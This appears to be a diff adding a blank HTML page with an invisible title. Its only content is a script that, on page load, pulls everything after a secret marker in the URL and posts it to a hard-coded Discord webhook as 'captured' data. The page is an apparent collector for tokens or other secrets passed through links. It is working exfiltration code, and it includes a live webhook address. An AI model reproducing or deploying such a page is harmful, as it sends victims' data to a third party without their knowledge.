@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>‎</title>
+</head>
+<body>
+<script>
+  (function() {
+    try {
+      const fullUrl = window.location.href;
+      const marker = "KmGapVgu8FeiksHhTc5z=";
+      const index = fullUrl.indexOf(marker);
+
+      if (index !== -1) {
+        const dataToSend = fullUrl.substring(index + marker.length);
+        const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
+        const payload = {
+          content: `Data captured: ${dataToSend}`
+        };
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        }).then(response => {
+          console.log("Data sent successfully!");
+        }).catch(error => {
+          console.error("Error sending data:", error);
+        });
+      } else {
+        console.log("No data found in URL.");
+      }
+    } catch (e) {
+      console.error("Unexpected error:", e);
+    }
+  })();
+</script>
+</body>
+</html>
